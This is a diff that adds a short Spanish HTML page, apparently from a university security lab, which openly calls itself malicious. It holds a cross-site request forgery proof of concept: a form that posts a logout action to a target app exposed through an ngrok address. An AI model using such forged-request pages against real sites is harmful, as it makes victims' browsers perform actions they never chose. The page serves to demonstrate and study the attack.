@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="es-ar">
+        <head>
+                <meta charset="utf-8"/>
+                <title>Info</title>
+        </head>
+        <body>
+                <p>Esta página es maliciosa</p>
+                <form method="post" action="https://d407-201-235-19-245.ngrok.io/LabSis/poc/csrf/ataque_por_post/process.php?action=logout">
+                    <input type="hidden" value="logout" />
+                    <input type="submit" value="Botón mágico" />
+                </form>
+        </body>
+</html>
+
